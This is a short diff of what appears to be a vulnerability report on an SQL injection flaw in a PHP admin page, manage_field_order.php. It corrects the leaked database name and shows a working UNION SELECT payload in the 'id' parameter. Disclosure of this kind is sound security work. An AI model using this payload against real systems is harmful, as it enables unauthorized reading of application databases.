@@ -8,7 +8,7 @@ Vulnerability File: /psrs/admin/categories/manage_field_order.php?id=
 
 Vulnerability location: /psrs/admin/categories/manage_field_order.php?id=, id
 
-Current database name: hsrs_db ,length is 7
+Current database name: psrs_db ,length is 7
 
 [+] Payload: /psrs/admin/categories/manage_field_order.php?id=-1%27%20union%20select%201,2,database(),4,5,6,7,8--+ // Leak place ---> id
 
